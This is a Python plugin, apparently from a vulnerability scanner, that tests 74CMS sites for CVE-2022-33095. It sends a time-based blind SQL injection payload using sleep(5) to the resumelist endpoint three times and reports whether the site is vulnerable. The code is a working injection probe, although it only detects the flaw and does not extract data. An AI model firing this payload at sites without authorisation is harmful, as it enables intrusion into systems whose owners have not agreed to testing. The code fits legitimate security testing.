import requests,re,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Cve_2022_33095:
	def randomInt(self,s,e):
		import random
		key=random.randint(int(s),int(e))
		return key

	def scan(self,baseurl):
		if baseurl[-1]=="/":
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		randJobfair = self.randomInt(1, 10)
		randSecond = self.randomInt(2, 4)
		url=baseurl+"v1_0/home/jobfairol/resumelist?jobfair_id="+str(randJobfair)+"&keyword=%27%2B(select(sleep(5)))%2B%27)%23"
		headers={"User-Agent": self.headers}
		response=requests.get(url,headers=headers,timeout=15,verify=self.ssl,proxies=self.proxy)
		if response.elapsed.total_seconds() >= 5 and response.status_code == 200 and "{\"code\":200" in response.text:
			r0=True
		else:
			r0=False
		url=baseurl+"v1_0/home/jobfairol/resumelist?jobfair_id="+str(randJobfair)+"&keyword=%27%2B(select(sleep(5)))%2B%27)%23"
		headers={"User-Agent": self.headers}
		response=requests.get(url,headers=headers,timeout=15,verify=self.ssl,proxies=self.proxy)
		if response.elapsed.total_seconds() >= 5 and response.status_code == 200 and "{\"code\":200" in response.text:
			r1=True
		else:
			r1=False
		url=baseurl+"v1_0/home/jobfairol/resumelist?jobfair_id="+str(randJobfair)+"&keyword=%27%2B(select(sleep(5)))%2B%27)%23"
		headers={"User-Agent": self.headers}
		response=requests.get(url,headers=headers,timeout=15,verify=self.ssl,proxies=self.proxy)
		if response.elapsed.total_seconds() >= 5 and response.status_code == 200 and "{\"code\":200" in response.text:
			r2=True
		else:
			r2=False
		if r0 and r1 and r2:
			OutPrintInfoSuc("74CMS", f"存在CVE-2022-33095: {baseurl}")
			if self.batch:
				OutPutFile("74cms_2022_33095.txt", f"存在CVE-2022-33095漏洞: {url}")
		else:
			if not self.batch:
				OutPrintInfo("74CMS", "不存在CVE-2022-33095")
		return
	def main(self,target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		self.headers = target["header"]
		proxy = target["proxy"]
		_, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
		if not self.batch:
			OutPrintInfo("74CMS", "开始检测CVE-2022-33095...")
		self.scan(url)
		if not self.batch:
			OutPrintInfo("74CMS", "CVE-2022-33095检测结束")


